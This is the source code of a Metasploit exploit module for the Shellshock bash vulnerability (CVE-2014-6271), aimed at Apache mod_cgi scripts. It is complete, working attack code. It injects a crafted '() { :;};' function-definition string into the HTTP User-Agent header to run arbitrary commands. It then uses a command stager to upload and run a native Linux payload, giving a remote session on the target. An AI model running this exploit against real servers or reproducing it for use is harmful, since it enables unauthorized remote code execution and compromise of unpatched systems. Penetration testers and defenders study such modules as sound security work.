# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Apache mod_cgi Bash Environment Variable Code Injection&#039;,
      &#039;Description&#039; => %q{
        This module exploits a code injection in specially crafted environment
        variables in Bash, specifically targeting Apache mod_cgi scripts through
        the HTTP_USER_AGENT variable.
      },
      &#039;Author&#039; => [
        &#039;Stephane Chazelas&#039;, # Vulnerability discovery
        &#039;wvu&#039;, # Original Metasploit aux module
        &#039;juan vazquez&#039; # Allow wvu&#039;s module to get native sessions
      ],
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2014-6271&#039;],
        [&#039;URL&#039;, &#039;https://access.redhat.com/articles/1200223&#039;],
        [&#039;URL&#039;, &#039;http://seclists.org/oss-sec/2014/q3/649&#039;]
      ],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 2048
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux x86&#039;,
            {
              &#039;Platform&#039;        => &#039;linux&#039;,
              &#039;Arch&#039;            => ARCH_X86,
              &#039;CmdStagerFlavor&#039; => [ :echo, :printf ]
            }
          ],
          [ &#039;Linux x86_64&#039;,
            {
              &#039;Platform&#039;        => &#039;linux&#039;,
              &#039;Arch&#039;            => ARCH_X86_64,
              &#039;CmdStagerFlavor&#039; => [ :echo, :printf ]
            }
          ]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 24 2014&#039;,
      &#039;License&#039; => MSF_LICENSE
    ))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to CGI script&#039;]),
      OptEnum.new(&#039;METHOD&#039;, [true, &#039;HTTP method to use&#039;, &#039;GET&#039;, [&#039;GET&#039;, &#039;POST&#039;]]),
      OptInt.new(&#039;CMD_MAX_LENGTH&#039;, [true, &#039;CMD max line length&#039;, 2048]),
      OptString.new(&#039;RPATH&#039;, [true, &#039;Target PATH for binaries used by the CmdStager&#039;, &#039;/bin&#039;]),
      OptInt.new(&#039;TIMEOUT&#039;, [true, &#039;HTTP read response timeout (seconds)&#039;, 5])
    ], self.class)
  end

  def check
    res = req("echo #{marker}")

    if res && res.body.include?(marker * 3)
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    # Cannot use generic/shell_reverse_tcp inside an elf
    # Checking before proceeds
    if generate_payload_exe.blank?
      fail_with(Failure::BadConfig, "#{peer} - Failed to store payload inside executable, please select a native payload")
    end

    execute_cmdstager(:linemax => datastore[&#039;CMD_MAX_LENGTH&#039;], :nodelete => true)

    # A last chance after the cmdstager
    # Trying to make it generic
    unless session_created?
      req("#{stager_instance.instance_variable_get("@tempdir")}#{stager_instance.instance_variable_get("@var_elf")}")
    end
  end

  def execute_command(cmd, opts)
    cmd.gsub!(&#039;chmod&#039;, "#{datastore[&#039;RPATH&#039;]}/chmod")

    req(cmd)
  end

  def req(cmd)
    send_request_cgi(
      {
        &#039;method&#039; => datastore[&#039;METHOD&#039;],
        &#039;uri&#039; => normalize_uri(target_uri.path.to_s),
        &#039;agent&#039; => "() { :;};echo #{marker}$(#{cmd})#{marker}"
      }, datastore[&#039;TIMEOUT&#039;])
  end

  def marker
    @marker ||= rand_text_alphanumeric(rand(42) + 1)
  end
end

